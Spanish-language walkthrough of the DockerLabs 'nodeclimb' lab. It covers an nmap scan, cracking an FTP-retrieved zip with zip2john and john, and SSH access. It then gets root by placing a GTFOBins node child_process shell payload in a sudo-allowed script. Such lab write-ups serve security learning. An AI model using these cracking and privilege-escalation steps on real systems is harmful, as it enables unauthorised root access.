nmap: 21,22

![image](https://github.com/user-attachments/assets/f278b033-4ada-4db4-bd22-f1b64aea118c)

vamos al ftp y nos pasamos el zip

![image](https://github.com/user-attachments/assets/e7fd669e-f52c-4af9-be43-554efac6afdb)

y nos pide contraseña

![image](https://github.com/user-attachments/assets/6b7ccde2-388d-42a7-9702-95da8b0c5a48)

ahora sacamos la contraseña con el comando

     zip2john secretitopicaron.zip

después 

     john has_zip


y da

![[jhon1.png]]

ahora sacamos el zip

![[password.png]]

y obtenemos la contraseña y usuario, entramos por el ssh, ahora entramos

![[dockerlabs/facil/nodeclimb/conexion.png]]

al hacer sudo -l podemos ver que hay un archivo script.js pero no tiene nada dentro, pero igual esta el node

![[dockerlabs/facil/nodeclimb/script.png]]

buscamos el node: https://gtfobins.github.io/gtfobins/node/
dentro del script.js que esta vacío colocamos este comando

     require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]}) 

y ejecutamos el script

     sudo /usr/bin/node /home/mario/script.js

![[dockerlabs/facil/nodeclimb/root.png]]

y somos root!
